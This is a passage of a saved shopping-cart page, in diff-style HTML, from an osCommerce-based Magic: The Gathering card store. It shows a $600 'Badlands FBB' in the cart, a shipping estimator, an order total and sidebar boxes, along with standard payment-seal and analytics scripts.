+    <td height="14" class="infoBoxHeading" nowrap><img src="images/pixel_trans.gif" width="11" height="14" border="0" alt="Magic Cards" title="Magic Cards"></td>
+  </tr>
+</table>
+<table border="0" width="100%" cellspacing="0" cellpadding="1" class="infoBox">
+  <tr>
+    <td><table border="0" width="100%" cellspacing="0" cellpadding="2" class="infoBoxContents">
+  <tr>
+    <td class="boxText"><a href="https://www.wizardscupboard.com/articles.php?osCsid=441b60259e389f204676a3a90e5e1847">All Articles</a><br><a href="https://www.wizardscupboard.com/card-combos-t-3.html?osCsid=441b60259e389f204676a3a90e5e1847">Card Combos</a>&nbsp;(2)<br><a href="https://www.wizardscupboard.com/decks-t-2.html?osCsid=441b60259e389f204676a3a90e5e1847">Decks</a>&nbsp;(2)<br><a href="https://www.wizardscupboard.com/general-magic-t-1.html?osCsid=441b60259e389f204676a3a90e5e1847">General Magic</a>&nbsp;(1)<br></td>
+  </tr>
+</table>
+</td>
+  </tr>
+</table>
+            </td>
+          </tr>
+<!-- topics_eof //--><!-- authors //-->
+          <tr>
+            <td>
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td height="14" class="infoBoxHeading" valign="top"><img src="images/infobox/corner_right_left.gif" width="11" height="14" border="0" alt="Magic the Gathering Cards" title="Magic the Gathering Cards"></td>
+    <td width="100%" height="14" class="infoBoxHeading">Articles by Author</td>
+    <td height="14" class="infoBoxHeading" nowrap><img src="images/pixel_trans.gif" width="11" height="14" border="0" alt="Magic Cards" title="Magic Cards"></td>
+  </tr>
+</table>
+<table border="0" width="100%" cellspacing="0" cellpadding="1" class="infoBox">
+  <tr>
+    <td><table border="0" width="100%" cellspacing="0" cellpadding="2" class="infoBoxContents">
+  <tr>
+    <td class="boxText"><form name="authors" action="https://www.wizardscupboard.com/articles.php" method="get"><select name="authors_id" onChange="this.form.submit();" size="1" style="width: 100%"><option value="" SELECTED>Please Select</option><option value="2">Gabriel Showers</option><option value="4">J. Turner</option><option value="3">Justin Vizaro</option><option value="1">The Wizard&#039;s Cupboar..</option></select><input type="hidden" name="osCsid" value="441b60259e389f204676a3a90e5e1847"></form></td>
+  </tr>
+</table>
+</td>
+  </tr>
+</table>
+            </td>
+          </tr>
+<!-- authors_eof //-->
+<!-- information //-->
+          <tr>
+            <td>
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td height="14" class="infoBoxHeading" valign="top"><img src="images/infobox/corner_right_left.gif" width="11" height="14" border="0" alt="Magic the Gathering Cards" title="Magic the Gathering Cards"></td>
+    <td width="100%" height="14" class="infoBoxHeading">Promotion</td>
+    <td height="14" class="infoBoxHeading" nowrap><img src="images/pixel_trans.gif" width="11" height="14" border="0" alt="Magic Cards" title="Magic Cards"></td>
+  </tr>
+</table>
+<table border="0" width="100%" cellspacing="0" cellpadding="1" class="infoBox">
+  <tr>
+    <td><table border="0" width="100%" cellspacing="0" cellpadding="2" class="infoBoxContents">
+  <tr>
+    <td align="left" class="boxText">Something special this way comes!</td>
+  </tr>
+</table>
+</td>
+  </tr>
+</table>
+            </td>
+          </tr>
+<!-- information_eof //-->
+<!-- authorize_net logo //-->
+          <tr>
+            <td align="center">
+<!-- (c) 2005, 2010. Authorize.Net is a registered trademark of CyberSource Corporation --> <div class="AuthorizeNetSeal"> <script type="text/javascript" language="javascript">var ANS_customer_id="7a609ad3-f89a-44b6-98a5-ca3d1c0018d2";</script> <script type="text/javascript" language="javascript" src="//verify.authorize.net/anetseal/seal.js" ></script> <a href="http://www.authorize.net/" id="AuthorizeNetText" target="_blank">Credit Card Services</a> </div>
+
+            </td>
+          </tr>
+<!-- authorize_net logo //--><!-- left_navigation_eof //-->
+    </table></td>
+<!-- body_text //-->
+    <td width="100%" valign="top"><form name="cart_quantity" action="https://www.wizardscupboard.com/shopping_cart.php?action=update_product&amp;osCsid=441b60259e389f204676a3a90e5e1847" method="post"><table border="0" width="100%" cellspacing="0" cellpadding="0">
+      <tr>
+        <td><table border="0" width="100%" cellspacing="0" cellpadding="0">
+          <tr>
+            <td class="pageHeading">Please remember that if you are shopping as a guest, once you create your account, your shopping cart items will merge.  Enjoy shopping!</td>
+          </tr>
+        </table></td>
+      </tr>
+      <tr>
+        <td><img src="images/pixel_trans.gif" width="100%" height="10" border="0" alt=""></td>
+      </tr>
+      <tr>
+        <td>
+<table border="0" width="100%" cellspacing="0" cellpadding="2" class="productListing">
+  <tr>
+    <td align="center" class="productListing-heading">Remove</td>
+    <td class="productListing-heading">Product(s)</td>
+    <td align="center" class="productListing-heading">Qty.</td>
+    <td align="right" class="productListing-heading">Total</td>
+  </tr>
+  <tr class="productListing-even">
+    <td align="center" class="productListing-data" valign="top"><input type="checkbox" name="cart_delete[]" value="55061"></td>
+    <td class="productListing-data"><table border="0" cellspacing="2" cellpadding="2">  <tr>    <td class="productListing-data" valign="top"><a href="https://www.wizardscupboard.com/badlands-fbb-p-55061.html?osCsid=441b60259e389f204676a3a90e5e1847"><b>Badlands FBB</b></a><span class="markProductOutOfStock">***</span>    </td>  </tr></table></td>
+    <td align="center" class="productListing-data" valign="top"><input type="text" name="cart_quantity[]" value="1" size="4"><input type="hidden" name="products_id[]" value="55061"></td>
+    <td align="right" class="productListing-data" valign="top"><b>$600.00</b></td>
+  </tr>
+</table>
+        </td>
+      </tr>
+      <tr>
+        <td><img src="images/pixel_trans.gif" width="100%" height="10" border="0" alt=""></td>
+      </tr>
+      <tr>
+        <td align="right" class="main"><b>Sub-Total: $600.00</b></td>
+      </tr>
+      <tr>
+        <td class="stockWarning" align="center"><br>Products marked with *** dont exist in desired quantity in our stock.<br>Please alter the quantity of products marked with (***)</td>
+      </tr>
+      <tr>
+        <td><img src="images/pixel_trans.gif" width="100%" height="10" border="0" alt=""></td>
+      </tr>
+      <tr>
+        <td><table border="0" width="100%" cellspacing="1" cellpadding="2" class="infoBox">
+          <tr class="infoBoxContents">
+            <td><table border="0" width="100%" cellspacing="0" cellpadding="2">
+              <tr>
+                <td width="10"><img src="images/pixel_trans.gif" width="10" height="1" border="0" alt=""></td>
+                <td class="main"><input type="image" src="includes/languages/english/images/buttons/button_update_cart.gif" alt="Update Cart" title=" Update Cart "></td>
+                <td align="right" class="main"><a href="https://www.wizardscupboard.com/checkout_shipping.php?osCsid=441b60259e389f204676a3a90e5e1847"><img src="includes/languages/english/images/buttons/button_checkout.gif" width="98" height="30" border="0" alt="Checkout" title="Checkout"></a></td>
+                <td width="10"><img src="images/pixel_trans.gif" width="10" height="1" border="0" alt=""></td>
+              </tr>
+            </table></td>
+          </tr>
+        </table></td>
+      </tr>
+      </form><tr>
+        <td><br><!-- shipping_estimator //-->
+<script language="JavaScript">
+  function shipincart_submit(sid){
+    if(sid){
+      document.estimator.sid.value=sid;
+    }
+    document.estimator.submit();
+    return false;
+  }
+</script>
+              <table align="center"><tr valign="top"><td>
+
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td height="14" class="infoBoxHeading" valign="top"><img src="images/infobox/corner_right_left.gif" width="11" height="14" border="0" alt="Magic the Gathering Cards" title="Magic the Gathering Cards"></td>
+    <td width="100%" height="14" class="infoBoxHeading"><b>Shipping Estimate</b></td>
+    <td height="14" class="infoBoxHeading" nowrap><img src="images/pixel_trans.gif" width="11" height="14" border="0" alt="Magic Cards" title="Magic Cards"></td>
+  </tr>
+</table>
+<table border="0" width="100%" cellspacing="0" cellpadding="1" class="infoBox">
+  <tr>
+    <td><table border="0" width="100%" cellspacing="0" cellpadding="2" class="infoBoxContents">
+  <tr>
+    <td class="boxText"><form name="estimator" action="https://www.wizardscupboard.com/shopping_cart.php?osCsid=441b60259e389f204676a3a90e5e1847" method="post"><input type="hidden" name="sid"><table>Please <a href="https://www.wizardscupboard.com/login.php?osCsid=441b60259e389f204676a3a90e5e1847"><u>Log In</u></a>, to display your personal shipping costs.<br />&nbsp;<br /><tr><td colspan="3" class="main" nowrap>Country:&nbsp;<select name="country_id" style="width=200"><option value="">Please Select</option><option value="1">Afghanistan</option><option value="2">Albania</option><option value="3">Algeria</option><option value="4">American Samoa</option><option value="5">Andorra</option><option value="6">Angola</option><option value="7">Anguilla</option><option value="8">Antarctica</option><option value="9">Antigua and Barbuda</option><option value="10">Argentina</option><option value="11">Armenia</option><option value="12">Aruba</option><option value="13">Australia</option><option value="14">Austria</option><option value="15">Azerbaijan</option><option value="16">Bahamas</option><option value="17">Bahrain</option><option value="18">Bangladesh</option><option value="19">Barbados</option><option value="20">Belarus</option><option value="21">Belgium</option><option value="22">Belize</option><option value="23">Benin</option><option value="24">Bermuda</option><option value="25">Bhutan</option><option value="26">Bolivia</option><option value="27">Bosnia and Herzegowina</option><option value="28">Botswana</option><option value="29">Bouvet Island</option><option value="30">Brazil</option><option value="31">British Indian Ocean Territory</option><option value="32">Brunei Darussalam</option><option value="33">Bulgaria</option><option value="34">Burkina Faso</option><option value="35">Burundi</option><option value="36">Cambodia</option><option value="37">Cameroon</option><option value="38">Canada</option><option value="39">Cape Verde</option><option value="40">Cayman Islands</option><option value="41">Central African Republic</option><option value="42">Chad</option><option value="43">Chile</option><option value="44">China</option><option value="45">Christmas Island</option><option value="46">Cocos (Keeling) Islands</option><option value="47">Colombia</option><option value="48">Comoros</option><option value="49">Congo</option><option value="50">Cook Islands</option><option value="51">Costa Rica</option><option value="52">Cote D&#039;Ivoire</option><option value="53">Croatia</option><option value="54">Cuba</option><option value="55">Cyprus</option><option value="56">Czech Republic</option><option value="57">Denmark</option><option value="58">Djibouti</option><option value="59">Dominica</option><option value="60">Dominican Republic</option><option value="61">East Timor</option><option value="62">Ecuador</option><option value="63">Egypt</option><option value="64">El Salvador</option><option value="65">Equatorial Guinea</option><option value="66">Eritrea</option><option value="67">Estonia</option><option value="68">Ethiopia</option><option value="69">Falkland Islands (Malvinas)</option><option value="70">Faroe Islands</option><option value="71">Fiji</option><option value="72">Finland</option><option value="73">France</option><option value="75">French Guiana</option><option value="76">French Polynesia</option><option value="77">French Southern Territories</option><option value="78">Gabon</option><option value="79">Gambia</option><option value="80">Georgia</option><option value="81">Germany</option><option value="82">Ghana</option><option value="83">Gibraltar</option><option value="84">Greece</option><option value="85">Greenland</option><option value="86">Grenada</option><option value="87">Guadeloupe</option><option value="88">Guam</option><option value="89">Guatemala</option><option value="90">Guinea</option><option value="91">Guinea-bissau</option><option value="92">Guyana</option><option value="93">Haiti</option><option value="94">Heard and Mc Donald Islands</option><option value="95">Honduras</option><option value="96">Hong Kong</option><option value="97">Hungary</option><option value="98">Iceland</option><option value="99">India</option><option value="100">Indonesia</option><option value="101">Iran (Islamic Republic of)</option><option value="102">Iraq</option><option value="103">Ireland</option><option value="104">Israel</option><option value="105">Italy</option><option value="106">Jamaica</option><option value="107">Japan</option><option value="108">Jordan</option><option value="109">Kazakhstan</option><option value="110">Kenya</option><option value="111">Kiribati</option><option value="112">Korea, Democratic People&#039;s Republic of</option><option value="113">Korea, Republic of</option><option value="114">Kuwait</option><option value="115">Kyrgyzstan</option><option value="116">Lao People&#039;s Democratic Republic</option><option value="117">Latvia</option><option value="118">Lebanon</option><option value="119">Lesotho</option><option value="120">Liberia</option><option value="121">Libyan Arab Jamahiriya</option><option value="122">Liechtenstein</option><option value="123">Lithuania</option><option value="124">Luxembourg</option><option value="125">Macau</option><option value="126">Macedonia, The Former Yugoslav Republic of</option><option value="127">Madagascar</option><option value="128">Malawi</option><option value="129">Malaysia</option><option value="130">Maldives</option><option value="131">Mali</option><option value="132">Malta</option><option value="133">Marshall Islands</option><option value="134">Martinique</option><option value="135">Mauritania</option><option value="136">Mauritius</option><option value="137">Mayotte</option><option value="138">Mexico</option><option value="139">Micronesia, Federated States of</option><option value="140">Moldova, Republic of</option><option value="141">Monaco</option><option value="142">Mongolia</option><option value="143">Montserrat</option><option value="144">Morocco</option><option value="145">Mozambique</option><option value="146">Myanmar</option><option value="147">Namibia</option><option value="148">Nauru</option><option value="149">Nepal</option><option value="150">Netherlands</option><option value="151">Netherlands Antilles</option><option value="152">New Caledonia</option><option value="153">New Zealand</option><option value="154">Nicaragua</option><option value="155">Niger</option><option value="156">Nigeria</option><option value="157">Niue</option><option value="158">Norfolk Island</option><option value="159">Northern Mariana Islands</option><option value="160">Norway</option><option value="161">Oman</option><option value="162">Pakistan</option><option value="163">Palau</option><option value="164">Panama</option><option value="165">Papua New Guinea</option><option value="166">Paraguay</option><option value="167">Peru</option><option value="168">Philippines</option><option value="169">Pitcairn</option><option value="170">Poland</option><option value="171">Portugal</option><option value="172">Puerto Rico</option><option value="173">Qatar</option><option value="174">Reunion</option><option value="175">Romania</option><option value="176">Russian Federation</option><option value="177">Rwanda</option><option value="178">Saint Kitts and Nevis</option><option value="179">Saint Lucia</option><option value="180">Saint Vincent and the Grenadines</option><option value="181">Samoa</option><option value="182">San Marino</option><option value="183">Sao Tome and Principe</option><option value="184">Saudi Arabia</option><option value="185">Senegal</option><option value="236">Serbia, Republic of</option><option value="186">Seychelles</option><option value="187">Sierra Leone</option><option value="188">Singapore</option><option value="189">Slovakia (Slovak Republic)</option><option value="190">Slovenia</option><option value="191">Solomon Islands</option><option value="192">Somalia</option><option value="193">South Africa</option><option value="194">South Georgia and the South Sandwich Islands</option><option value="195">Spain</option><option value="196">Sri Lanka</option><option value="197">St. Helena</option><option value="198">St. Pierre and Miquelon</option><option value="199">Sudan</option><option value="200">Suriname</option><option value="201">Svalbard and Jan Mayen Islands</option><option value="202">Swaziland</option><option value="203">Sweden</option><option value="204">Switzerland</option><option value="205">Syrian Arab Republic</option><option value="206">Taiwan</option><option value="207">Tajikistan</option><option value="208">Tanzania, United Republic of</option><option value="209">Thailand</option><option value="210">Togo</option><option value="211">Tokelau</option><option value="212">Tonga</option><option value="213">Trinidad and Tobago</option><option value="214">Tunisia</option><option value="215">Turkey</option><option value="216">Turkmenistan</option><option value="217">Turks and Caicos Islands</option><option value="218">Tuvalu</option><option value="219">Uganda</option><option value="220">Ukraine</option><option value="221">United Arab Emirates</option><option value="222">United Kingdom</option><option value="223" SELECTED>United States</option><option value="224">United States Minor Outlying Islands</option><option value="225">Uruguay</option><option value="226">Uzbekistan</option><option value="227">Vanuatu</option><option value="228">Vatican City State (Holy See)</option><option value="229">Venezuela</option><option value="230">Viet Nam</option><option value="231">Virgin Islands (British)</option><option value="232">Virgin Islands (U.S.)</option><option value="233">Wallis and Futuna Islands</option><option value="234">Western Sahara</option><option value="235">Yemen</option><option value="237">Zaire</option><option value="238">Zambia</option><option value="239">Zimbabwe</option></select><br />Zip Code:&nbsp;<input type="text" name="zip_code" size="5">&nbsp;<td><a href="_" onclick="return shipincart_submit('');"><img src="includes/languages/english/images/buttons/button_update_cart.gif" width="122" height="30" border="0" alt="Update Cart" title="Update Cart"> </a></td></td></tr><tr><td colspan="3" class="main">&nbsp;</td></tr><tr><td class="main"><b>Carrier</b></td><td class="main" align="left"><b>Delivery Methods</b></td><td class="main" align="right"><b>Rates</b></td></tr><tr><td colspan="3" class="main"><img src="images/pixel_black.gif" width="100%" height="1" border="0" alt=""></td></tr><tr class=""><td class="main">&nbsp;&nbsp;&nbsp;</td><td class="main"><a title="Click to select this shipping method in the total." href="_" onclick="return shipincart_submit('spu_spu');">Store Pickup.&nbsp;(Store Pickup.)</a>&nbsp;&nbsp;&nbsp;</td><td align="right" class="main">$0.00</td></tr></table></form></td>
+  </tr>
+</table>
+</td>
+  </tr>
+</table>
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td height="14" class="infoBoxHeading" valign="top"><img src="images/infobox/corner_right_left.gif" width="11" height="14" border="0" alt="Magic the Gathering Cards" title="Magic the Gathering Cards"></td>
+    <td width="100%" height="14" class="infoBoxHeading"><b>Order Total Estimate</b></td>
+    <td height="14" class="infoBoxHeading" nowrap><img src="images/pixel_trans.gif" width="11" height="14" border="0" alt="Magic Cards" title="Magic Cards"></td>
+  </tr>
+</table>
+<table border="0" width="100%" cellspacing="0" cellpadding="1" class="infoBox">
+  <tr>
+    <td><table border="0" width="100%" cellspacing="0" cellpadding="2" class="infoBoxContents">
+  <tr>
+    <td class="boxText"><table align="right">              <tr>
+                <td align="right" class="main">Sub-Total:</td>
+                <td align="right" class="main">$600.00</td>
+              </tr>              <tr>
+                <td align="right" class="main">Store-Wide Discount:</td>
+                <td align="right" class="main">$18.00</td>
+              </tr>              <tr>
+                <td align="right" class="main">Insurance/Handling:</td>
+                <td align="right" class="main">$15.35</td>
+              </tr>              <tr>
+                <td align="right" class="main">Total:</td>
+                <td align="right" class="main"><b>$597.35</b></td>
+              </tr></table></td>
+  </tr>
+</table>
+</td>
+  </tr>
+</table>
+             </td></tr></table></td>
+      </tr>
+    </table></form></td>
+<!-- body_text_eof //-->
+    <td width="150" valign="top"><table border="0" width="150" cellspacing="0" cellpadding="2">
+<!-- right_navigation //-->
+<!-- shopping_cart //-->
+          <tr>
+            <td>
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td height="14" class="infoBoxHeading" valign="top"><img src="images/infobox/corner_right_left.gif" width="11" height="14" border="0" alt="Magic the Gathering Cards" title="Magic the Gathering Cards"></td>
+    <td width="100%" height="14" class="infoBoxHeading">Shopping Cart</td>
+    <td height="14" class="infoBoxHeading" nowrap><a href="https://www.wizardscupboard.com/shopping_cart.php?osCsid=441b60259e389f204676a3a90e5e1847"><img src="images/infobox/arrow_right.gif" width="12" height="10" border="0" alt="more" title="more"></a><img src="images/infobox/corner_right.gif" width="11" height="14" border="0" alt=""></td>
+  </tr>
+</table>
+<table border="0" width="100%" cellspacing="0" cellpadding="1" class="infoBox">
+  <tr>
+    <td><table border="0" width="100%" cellspacing="0" cellpadding="2" class="infoBoxContents">
+  <tr>
+    <td class="boxText"><table border="0" width="100%" cellspacing="0" cellpadding="0"><table border="0" width="100%" cellspacing="0" cellpadding="0"><tr><td align="right" valign="top" class="infoBoxContents"><span class="newItemInCart">1&nbsp;x&nbsp;</span></td><td valign="top" class="infoBoxContents"><a href="https://www.wizardscupboard.com/badlands-fbb-p-55061.html?osCsid=441b60259e389f204676a3a90e5e1847"><span class="newItemInCart">Badlands FBB</span></a></td></tr></table></td>
+  </tr>
+  <tr>
+    <td class="boxText"><img src="images/pixel_black.gif" width="100%" height="1" border="0" alt=""></td>
+  </tr>
+  <tr>
+    <td align="right" class="boxText">$600.00</td>
+  </tr>
+</table>
+</td>
+  </tr>
+</table>
+            </td>
+          </tr>
+<!-- shopping_cart_eof //-->
+<!-- specials //-->
+          <tr>
+            <td>
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td height="14" class="infoBoxHeading" valign="top"><img src="images/infobox/corner_right_left.gif" width="11" height="14" border="0" alt="Magic the Gathering Cards" title="Magic the Gathering Cards"></td>
+    <td width="100%" height="14" class="infoBoxHeading">Specials</td>
+    <td height="14" class="infoBoxHeading" nowrap><a href="https://www.wizardscupboard.com/specials.php?osCsid=441b60259e389f204676a3a90e5e1847"><img src="images/infobox/arrow_right.gif" width="12" height="10" border="0" alt="more" title="more"></a><img src="images/pixel_trans.gif" width="11" height="14" border="0" alt="Magic Cards" title="Magic Cards"></td>
+  </tr>
+</table>
+<table border="0" width="100%" cellspacing="0" cellpadding="1" class="infoBox">
+  <tr>
+    <td><table border="0" width="100%" cellspacing="0" cellpadding="2" class="infoBoxContents">
+  <tr>
+    <td align="center" class="boxText"><a href="https://www.wizardscupboard.com/global-series-p-53243.html?osCsid=441b60259e389f204676a3a90e5e1847"><img src="product_thumb.php?img=images/Global Series.jpg&amp;w=80&amp;h=66" width="80" height="66" border="0" alt="Global Series" title="Global Series"></a><br><a href="https://www.wizardscupboard.com/global-series-p-53243.html?osCsid=441b60259e389f204676a3a90e5e1847">Global Series</a><br><s>$24.95</s><br><span class="productSpecialPrice">$19.95</span></td>
+  </tr>
+</table>
+</td>
+  </tr>
+</table>
+            </td>
+          </tr>
+<!-- specials_eof //-->
+<!-- reviews //-->
+          <tr>
+            <td>
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+  <tr>
+    <td height="14" class="infoBoxHeading" valign="top"><img src="images/infobox/corner_right_left.gif" width="11" height="14" border="0" alt="Magic the Gathering Cards" title="Magic the Gathering Cards"></td>
+    <td width="100%" height="14" class="infoBoxHeading">Reviews</td>
+    <td height="14" class="infoBoxHeading" nowrap><a href="https://www.wizardscupboard.com/reviews.php?osCsid=441b60259e389f204676a3a90e5e1847"><img src="images/infobox/arrow_right.gif" width="12" height="10" border="0" alt="more" title="more"></a><img src="images/pixel_trans.gif" width="11" height="14" border="0" alt="Magic Cards" title="Magic Cards"></td>
+  </tr>
+</table>
+<table border="0" width="100%" cellspacing="0" cellpadding="1" class="infoBox">
+  <tr>
+    <td><table border="0" width="100%" cellspacing="0" cellpadding="2" class="infoBoxContents">
+  <tr>
+    <td class="boxText"><div align="center"><a href="https://www.wizardscupboard.com/hada-patrol-pri-26877.html?reviews_id=8705&amp;osCsid=441b60259e389f204676a3a90e5e1847"><img src="product_thumb.php?img=images/cards/RE/hadaspypatrol.jpg&amp;w=80&amp;h=111" width="80" height="111" border="0" alt="Hada Spy Patrol" title="Hada Spy Patrol"></a></div><a href="https://www.wizardscupboard.com/hada-patrol-pri-26877.html?reviews_id=8705&amp;osCsid=441b60259e389f204676a3a90e5e1847">This card is great level it up and play a blanchwood armor! ..</a><br><div align="center"><img src="images/stars_5.gif" width="56" height="13" border="0" alt="5 of 5 Stars!" title="5 of 5 Stars!"></div></td>
+  </tr>
+</table>
+</td>
+  </tr>
+</table>
+            </td>
+          </tr>
+<!-- reviews_eof //--><!-- events_calendar //-->
+
+  <tr>
+    <td>
+            <iframe name="calendar" id="calendar" class="calendarBox" 
+                align="center" valign="top" marginwidth="0" marginheight="0" frameborder="0" scrolling="no"
+                src="calendar_content.php?_month=&_year=">Sorry, your browser does not support iframes.</iframe>
+
+    </td>
+  </tr>
+<!-- events_calendar //-->
+
+<!--
+<tr>
+	<td>&nbsp;</td>
+</tr>
+<tr>
+	<td align="center"><img src="images/secure_seal.gif" alt="Secure Site"></td>
+</tr>
+//-->
+<!-- right_navigation_eof //-->
+    </table></td>
+  </tr>
+</table>
+<!-- body_eof //-->
+
+<!-- footer //-->
+
+<table border="0" width="1000" align="center" cellspacing="0" cellpadding="0">
+  <tr class="footer">
+    <td class="footer">&nbsp;&nbsp;Sunday September 29, 2019&nbsp;&nbsp;</td>
+    <td align="right" class="footer">&nbsp;&nbsp;148118282 page hits since Wednesday November 28, 2001&nbsp;&nbsp;</td>
+  </tr>
+</table>
+<br>
+<table border="0" width="1000" align="center" cellspacing="3" cellpadding="3">
+  <tr>
+    <td align="center" class="smallText">
+<a href="http://www.batchtech.com"><img border=0 src="images/batchtech_logo.gif" alt="Batch Technologies"></a><br><br>This site is best viewed at 1024 x 768 display running <a href="http://www.microsoft.com/windows/ie/default.asp" target="_blank"><u>Internet Explorer 5 or higher</u></a><br>Site structure originated from <a href="http://www.oscommerce.com" target="_blank">OSCommerce</a><br>All Magic the Gathering (mtg), Magic Cards, Magic the Gathering Cards scans © <a href="http://www.magicthegathering.com" target="_blank">Wizards of the Coast</a>    </td>
+  </tr>
+  <tr colspan="2">
+  	<td align="left">
+  	<!-- BOF show mobile link //-->
+		<!-- EOF show mobile link //-->
+  </td>
+	<td class="smallText" align="left"><a href="links.php">Links</a><br><br></td>
+	</tr>
+</table>
+<!-- footer_eof //-->
+<br>
+ <script src="https://ssl.google-analytics.com/urchin.js" type="text/javascript">
+ </script>
+ <script type="text/javascript">
+   _uacct="UA-2002620-1";
+   urchinTracker();
+ </script>
+<a href="http://www.instantssl.com" id="comodoTL">Comodo SSL Certificate</a>
+<script language="JavaScript" type="text/javascript">
+COT("https://www.wizardscupboard.com/images/secure_site.gif", "SC2", "none");
+</script></body>
 </html>
